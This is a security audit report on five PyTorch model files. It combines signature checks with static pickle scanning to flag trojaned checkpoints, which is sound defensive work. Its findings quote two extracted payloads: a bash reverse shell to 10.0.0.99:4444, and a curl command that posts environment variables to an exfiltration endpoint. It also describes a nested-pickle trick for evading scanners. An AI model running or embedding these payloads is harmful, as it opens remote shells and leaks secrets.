# AI Model Supply-Chain Security Assessment

| | |
|---|---|
| **Scope** | All model files in `models/` |
| **Trusted signer** | TensorTrust Labs (`signing_key.pub`) |
| **Key curve** | ASN1 OID: prime256v1 |
| **Trusted keyId** (from manifests that verify with this key) | `f87405548a7d3f2c` |
| **Key fingerprint (SHA-256 DER)** | `1ad34facfea23a44f8b20b80308455653d121a0b83bdcbff1d514da09f07ab2c` |
| **Date** | 2026-11-19 14:51 UTC |
| **Method** | Static analysis only - no model was loaded or unpickled |

## 1. Executive summary

| Model | Signed | Signature | Integrity (hash/size) | Payload scan | Risk | Recommended action |
|---|---|---|---|---|---|---|
| `model_oracle.pth` | Signed | Valid | Match | CLEAN | **Safe** | **Deploy** |
| `model_phantom.pth` | Signed | Valid | Match | MALICIOUS | **Unsafe** | **Do Not Deploy** |
| `model_sentinel.pth` | Signed | Valid | Match | CLEAN | **Safe** | **Deploy** |
| `model_specter.pth` | Unsigned | - | - | MALICIOUS | **Unsafe** | **Do Not Deploy** |
| `model_wraith.pth` | Signed | **Invalid** | Match | CLEAN | **Suspicious** | **Do Not Deploy** |

Totals: 2 Safe, 1 Suspicious, 2 Unsafe.

## 2. Methodology

1. **Signature verification.** Each model ships with a ModelGuard manifest (`<model>.sig.json`, media type `application/vnd.modelguard.signature.v1+json`). The manifest's ECDSA-P256-SHA256 signature covers the *hex SHA-256 digest string* of the model. It was verified with `openssl dgst -sha256 -verify signing_key.pub` against the TensorTrust Labs public key.
2. **Integrity.** Because the signature covers only the claimed digest, the model file was re-hashed (`sha256sum`) and its size compared with the signed values. Both must match for the signature to apply to the file on disk.
3. **Signer identity.** The manifest `keyId` was compared with the key ID derived from the TensorTrust public key.
4. **Payload scan.** Every pickle inside each archive was disassembled with Python `pickletools` (no execution). All `GLOBAL`/`STACK_GLOBAL`/`INST` imports were extracted and compared against an allowlist of globals a normal PyTorch checkpoint needs (`torch._utils._rebuild_tensor_v2`, `collections.OrderedDict`, `torch.*Storage`, ...). Imports from code-execution / I/O / network modules (`os`, `posix`, `subprocess`, `builtins`, `socket`, `runpy`, ...) are classed as malicious. String constants were searched for commands, URLs and IPs.
5. **Classification.** *Unsafe* = malicious payload (Do Not Deploy). *Suspicious* = unexplained globals/strings (Requires Further Review), or clean content without valid TensorTrust provenance (Do Not Deploy). *Safe* = valid signature, matching hash, only standard globals (Deploy).

## 3. Detailed findings

### model_oracle.pth - Safe / Deploy

**Assessment rationale**

- Valid TensorTrust Labs signature, integrity confirmed, and only standard PyTorch tensor-rebuild globals are referenced.

**Signature & integrity evidence**

| Check | Expected / signed | Observed | Result |
|---|---|---|---|
| Signature file | `model_oracle.pth.sig.json` | present | PASS |
| ECDSA signature (TensorTrust key) | Verified OK | Verified OK | PASS |
| Signer keyId | `f87405548a7d3f2c` | `f87405548a7d3f2c` | PASS |
| SHA-256 | `0ad23c81542f6c1d46bcf77bd2ab147112a9ab2bbcf68c14494a23942fbcc14e` | `0ad23c81542f6c1d46bcf77bd2ab147112a9ab2bbcf68c14494a23942fbcc14e` | PASS |
| Size (bytes) | 87845 | 87845 | PASS |
| Filename in manifest | `model_oracle.pth` | `model_oracle.pth` | PASS |
| Signature algorithm | ECDSA-P256-SHA256 | ECDSA-P256-SHA256 | info |
| Signed timestamp | - | 2026-06-12T05:33:06.723393+00:00 | info |

**Payload scan evidence**

- Format: PyTorch zip archive (torch.save >= 1.6); archive root folder: `model_oracle_clean`; pickles scanned: `model_oracle_clean/data.pkl`
- Object-construction opcodes: REDUCE=34, BUILD=1
- Note: archive root folder `model_oracle_clean` differs from the file name (the archive was created under a different name).

| Imported global | Classification | Occurrences (pickle @ byte offset) |
|---|---|---|
| `collections.OrderedDict` | Standard PyTorch | model_oracle_clean/data.pkl @2 (GLOBAL) |
| `torch.FloatStorage` | Standard PyTorch | model_oracle_clean/data.pkl @109 (GLOBAL) |
| `torch.LongStorage` | Standard PyTorch | model_oracle_clean/data.pkl @610 (GLOBAL) |
| `torch._utils._rebuild_tensor_v2` | Standard PyTorch | model_oracle_clean/data.pkl @58 (GLOBAL) |


### model_phantom.pth - Unsafe / Do Not Deploy

**Assessment rationale**

- A second pickle is hidden inside a string constant and decoded at load time (blocklist-evasion technique - generic scanners such as modelscan only inspect the outer pickle).
- Pickle imports dangerous callables: `posix.system`.
- References code that is not part of any library (`__main__._trojan_loader`) - it only resolves if the loading script defines it, typical of a trojan loader.
- Pickle imports non-allowlisted globals: `__main__._trojan_loader`, `_codecs.encode`.
- Pickle contains 2 suspicious string constant(s).

**Signature & integrity evidence**

| Check | Expected / signed | Observed | Result |
|---|---|---|---|
| Signature file | `model_phantom.pth.sig.json` | present | PASS |
| ECDSA signature (TensorTrust key) | Verified OK | Verified OK | PASS |
| Signer keyId | `f87405548a7d3f2c` | `f87405548a7d3f2c` | PASS |
| SHA-256 | `f31dde4895c8e1b82d3cb59f589c502920bdb653e30b1ad5b48d739cc1f3610d` | `f31dde4895c8e1b82d3cb59f589c502920bdb653e30b1ad5b48d739cc1f3610d` | PASS |
| Size (bytes) | 87607 | 87607 | PASS |
| Filename in manifest | `model_phantom.pth` | `model_phantom.pth` | PASS |
| Signature algorithm | ECDSA-P256-SHA256 | ECDSA-P256-SHA256 | info |
| Signed timestamp | - | 2026-06-12T05:33:06.719757+00:00 | info |

**Payload scan evidence**

- Format: PyTorch zip archive (torch.save >= 1.6); archive root folder: `model_phantom`; pickles scanned: `model_phantom/data.pkl`
- Object-construction opcodes: REDUCE=35

| Imported global | Classification | Occurrences (pickle @ byte offset) |
|---|---|---|
| `posix.system` | **MALICIOUS** | model_phantom/data.pkl -> nested pickle in string @1405 @28 (STACK_GLOBAL) |
| `__main__._trojan_loader` | **Not allowlisted** | model_phantom/data.pkl @2 (GLOBAL) |
| `_codecs.encode` | **Not allowlisted** | model_phantom/data.pkl @1387 (GLOBAL) |
| `collections.OrderedDict` | Standard PyTorch | model_phantom/data.pkl @182 (GLOBAL) |
| `torch.FloatStorage` | Standard PyTorch | model_phantom/data.pkl @108 (GLOBAL) |
| `torch.LongStorage` | Standard PyTorch | model_phantom/data.pkl @634 (GLOBAL) |
| `torch._utils._rebuild_tensor_v2` | Standard PyTorch | model_phantom/data.pkl @57 (GLOBAL) |

Suspicious string constants found in the pickle:

```
model_phantom/data.pkl: ...N.........posix...system....3bash -c 'bash -i >& /dev/tcp/10.0.0.99/4444 0>&1' &...R..
model_phantom/data.pkl -> nested pickle in string @1405: bash -c 'bash -i >& /dev/tcp/10.0.0.99/4444 0>&1' &
```

Hidden (nested) pickles decoded from string constants:

- `model_phantom/data.pkl -> nested pickle in string @1405`


### model_sentinel.pth - Safe / Deploy

**Assessment rationale**

- Valid TensorTrust Labs signature, integrity confirmed, and only standard PyTorch tensor-rebuild globals are referenced.

**Signature & integrity evidence**

| Check | Expected / signed | Observed | Result |
|---|---|---|---|
| Signature file | `model_sentinel.pth.sig.json` | present | PASS |
| ECDSA signature (TensorTrust key) | Verified OK | Verified OK | PASS |
| Signer keyId | `f87405548a7d3f2c` | `f87405548a7d3f2c` | PASS |
| SHA-256 | `03289a51ba794b40c9acda59aa991548f9ed84f3d7baa8a191eba0e1a6d2793e` | `03289a51ba794b40c9acda59aa991548f9ed84f3d7baa8a191eba0e1a6d2793e` | PASS |
| Size (bytes) | 87889 | 87889 | PASS |
| Filename in manifest | `model_sentinel.pth` | `model_sentinel.pth` | PASS |
| Signature algorithm | ECDSA-P256-SHA256 | ECDSA-P256-SHA256 | info |
| Signed timestamp | - | 2026-06-12T05:33:06.717682+00:00 | info |

**Payload scan evidence**

- Format: PyTorch zip archive (torch.save >= 1.6); archive root folder: `model_sentinel_clean`; pickles scanned: `model_sentinel_clean/data.pkl`
- Object-construction opcodes: REDUCE=34, BUILD=1
- Note: archive root folder `model_sentinel_clean` differs from the file name (the archive was created under a different name).

| Imported global | Classification | Occurrences (pickle @ byte offset) |
|---|---|---|
| `collections.OrderedDict` | Standard PyTorch | model_sentinel_clean/data.pkl @2 (GLOBAL) |
| `torch.FloatStorage` | Standard PyTorch | model_sentinel_clean/data.pkl @109 (GLOBAL) |
| `torch.LongStorage` | Standard PyTorch | model_sentinel_clean/data.pkl @610 (GLOBAL) |
| `torch._utils._rebuild_tensor_v2` | Standard PyTorch | model_sentinel_clean/data.pkl @58 (GLOBAL) |


### model_specter.pth - Unsafe / Do Not Deploy

**Assessment rationale**

- No signature file - provenance cannot be established.
- A second pickle is hidden inside a string constant and decoded at load time (blocklist-evasion technique - generic scanners such as modelscan only inspect the outer pickle).
- Pickle imports dangerous callables: `posix.system`.
- References code that is not part of any library (`__main__._trojan_loader`) - it only resolves if the loading script defines it, typical of a trojan loader.
- Pickle imports non-allowlisted globals: `__main__._trojan_loader`, `_codecs.encode`.
- Pickle contains 2 suspicious string constant(s).

**Signature & integrity evidence**

| Check | Expected / signed | Observed | Result |
|---|---|---|---|
| Signature file | `model_specter.pth.sig.json` | missing | FAIL |
| SHA-256 (observed) | - | `eb7e2740c3651cbe1f6882a16da6a011f09b240b81ef6451c868a3378127b0a4` | info |

**Payload scan evidence**

- Format: PyTorch zip archive (torch.save >= 1.6); archive root folder: `model_specter`; pickles scanned: `model_specter/data.pkl`
- Object-construction opcodes: REDUCE=35

| Imported global | Classification | Occurrences (pickle @ byte offset) |
|---|---|---|
| `posix.system` | **MALICIOUS** | model_specter/data.pkl -> nested pickle in string @1405 @28 (STACK_GLOBAL) |
| `__main__._trojan_loader` | **Not allowlisted** | model_specter/data.pkl @2 (GLOBAL) |
| `_codecs.encode` | **Not allowlisted** | model_specter/data.pkl @1387 (GLOBAL) |
| `collections.OrderedDict` | Standard PyTorch | model_specter/data.pkl @182 (GLOBAL) |
| `torch.FloatStorage` | Standard PyTorch | model_specter/data.pkl @108 (GLOBAL) |
| `torch.LongStorage` | Standard PyTorch | model_specter/data.pkl @634 (GLOBAL) |
| `torch._utils._rebuild_tensor_v2` | Standard PyTorch | model_specter/data.pkl @57 (GLOBAL) |

Suspicious string constants found in the pickle:

```
model_specter/data.pkl: ...T.........posix...system....9curl -s -X POST http://10.0.0.99:8080/exfil -d "$(env)" &...R..
model_specter/data.pkl -> nested pickle in string @1405: curl -s -X POST http://10.0.0.99:8080/exfil -d "$(env)" &
```

Hidden (nested) pickles decoded from string constants:

- `model_specter/data.pkl -> nested pickle in string @1405`


### model_wraith.pth - Suspicious / Do Not Deploy

**Assessment rationale**

- Signature does NOT verify with the TensorTrust Labs public key.
- Manifest keyId `8ad6a87f3e988665` does not match the TensorTrust key ID.
- Payload scan is clean, but deployment policy requires a valid TensorTrust Labs signature - re-obtain/re-sign the model from the vendor before use.

**Signature & integrity evidence**

| Check | Expected / signed | Observed | Result |
|---|---|---|---|
| Signature file | `model_wraith.pth.sig.json` | present | PASS |
| ECDSA signature (TensorTrust key) | Verified OK | Verification failure | **FAIL** |
| Signer keyId | `f87405548a7d3f2c` | `8ad6a87f3e988665` | **FAIL** |
| SHA-256 | `2745ee8e5c42c8d3101ad4d344401f86739e20775278f862e193dd1510f41284` | `2745ee8e5c42c8d3101ad4d344401f86739e20775278f862e193dd1510f41284` | PASS |
| Size (bytes) | 87845 | 87845 | PASS |
| Filename in manifest | `model_wraith.pth` | `model_wraith.pth` | PASS |
| Signature algorithm | ECDSA-P256-SHA256 | ECDSA-P256-SHA256 | info |
| Signed timestamp | - | 2026-06-12T05:33:06.720968+00:00 | info |

**Payload scan evidence**

- Format: PyTorch zip archive (torch.save >= 1.6); archive root folder: `model_wraith_clean`; pickles scanned: `model_wraith_clean/data.pkl`
- Object-construction opcodes: REDUCE=34, BUILD=1
- Note: archive root folder `model_wraith_clean` differs from the file name (the archive was created under a different name).

| Imported global | Classification | Occurrences (pickle @ byte offset) |
|---|---|---|
| `collections.OrderedDict` | Standard PyTorch | model_wraith_clean/data.pkl @2 (GLOBAL) |
| `torch.FloatStorage` | Standard PyTorch | model_wraith_clean/data.pkl @109 (GLOBAL) |
| `torch.LongStorage` | Standard PyTorch | model_wraith_clean/data.pkl @610 (GLOBAL) |
| `torch._utils._rebuild_tensor_v2` | Standard PyTorch | model_wraith_clean/data.pkl @58 (GLOBAL) |

## 4. Recommendations

1. Deploy only models classed **Safe**; quarantine the rest and report **Unsafe** models to TensorTrust Labs as a supply-chain incident.
2. Never `torch.load()` untrusted checkpoints. Use `torch.load(..., weights_only=True)` (default since PyTorch 2.6) or convert models to `safetensors`, which cannot carry code.
3. A valid signature proves *who* published a file, not that it is *safe*: run the payload scan even on correctly signed models.
4. Fix the ModelGuard verifier design: sign the file contents (or a canonical manifest that is always re-hashed by the verifier), pin the trusted key by fingerprint rather than trusting the `keyId` in the manifest, and fail closed on any mismatch.
5. Add this check to the CI/CD gate so unsigned or tampered models are rejected automatically.

## Appendix - reproduction commands

```bash
# signature over the signed digest string
jq -j .artifact.digest.value models/<m>.sig.json | openssl dgst -sha256 -verify signing_key.pub \
  -signature <(jq -r .signature.value models/<m>.sig.json | base64 -d)
# integrity
sha256sum models/<m>; stat -c %s models/<m>
# static pickle disassembly (never torch.load untrusted files)
unzip -p models/<m> '*/data.pkl' | python3 -I -m pickletools - | grep -E 'GLOBAL|REDUCE'
```
